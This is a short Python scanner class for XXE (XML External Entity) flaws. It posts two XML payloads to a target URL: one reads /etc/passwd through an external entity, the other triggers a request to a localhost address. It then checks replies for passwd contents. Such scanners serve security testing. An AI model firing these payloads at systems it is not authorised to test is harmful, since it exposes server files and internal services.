import requests

class XXEScanner:
    """
    Detects XXE (XML External Entity) vulnerabilities.
    Can work with any web app that consumes XML input.
    """
    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.payloads = [
            """<?xml version="1.0"?>
                <!DOCTYPE foo [ <!ELEMENT foo ANY >
                <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
                <foo>&xxe;</foo>""",
            """<?xml version="1.0"?>
                <!DOCTYPE root [
                <!ENTITY xxe SYSTEM "http://127.0.0.1:8000/test">]>
                <root>&xxe;</root>"""
        ]

    def test_payload(self):
        results = []
        headers = {"Content-Type": "application/xml"}
        for payload in self.payloads:
            try:
                response = requests.post(self.target_url, data=payload, headers=headers, timeout=self.timeout)
                results.append({
                    "payload": payload,
                    "status": response.status_code,
                    "content_snippet": response.text[:200]
                })
            except requests.exceptions.RequestException as e:
                results.append({"payload": payload, "error": str(e)})
        return results

    def is_vulnerable(self, response_snippet: str) -> bool:
        # Heuristic: presence of sensitive file content keywords
        sensitive_keywords = ["root:x:", "/etc/passwd", "uid=", "gid="]
        return any(k in response_snippet for k in sensitive_keywords)
